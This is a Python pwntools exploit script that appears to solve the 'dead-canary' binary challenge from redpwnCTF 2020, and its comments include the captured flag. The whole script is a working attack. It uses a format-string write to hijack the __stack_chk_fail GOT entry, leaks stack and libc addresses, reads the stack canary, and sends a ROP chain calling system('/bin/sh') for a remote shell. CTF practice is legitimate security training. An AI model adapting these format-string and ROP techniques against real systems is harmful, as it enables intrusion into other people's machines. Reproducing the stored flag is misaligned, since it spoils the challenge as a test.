from pwn import *

file = "./dead-canary"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
#r = process(file)
#raw_input()

r = remote("2020.redpwnc.tf", 31744)
# flag{jump_1nt0_th3_l1brary}

# 43 - 0x2c0 canary
# 57 dl_init - 0x10733
payload = "%1847x%18$hn %43$p %57$p".ljust(96)
payload += pack(bin.got["__stack_chk_fail"])

r.sendafter("What is your name:", payload.ljust(265))
r.recvuntil("0x")

stackLeak = int("0x"+r.recvuntil(" ", drop=True), 16)
libLeak = int(r.recvuntil(" ", drop=True), 16)

canaryStackAddr = (stackLeak - 0x890) + 1
libcBaseAddr = (libLeak - 0x10733) - 0x3f1000
systemAddr = libcBaseAddr + 0x000000000004f440
binshAddr = libcBaseAddr + 0x1b3e9a

print "[*] canary stack addr 0x%x" % canaryStackAddr
print "[*] libc base 0x%x" % libcBaseAddr

payload = "#%18$s#".ljust(8)
payload += pack(0x00000000004005d6) # ret
payload += pack(0x00000000004008e3) # pop rdi
payload += pack(binshAddr)
payload += pack(systemAddr)
payload = payload.ljust(96)
payload += pack(canaryStackAddr)
r.sendafter("What is your name:", payload.ljust(265))

r.recvuntil("#")
canary = unpack("\x00" + r.recv(7))

print "[*] canary 0x%x" % canary

payload = "A".ljust(264)
payload += pack(canary)
payload += pack(0xdeadbeef)
payload += pack(0x00000000004008e3) # pop rdi

r.sendafter("What is your name:", payload)
r.interactive()


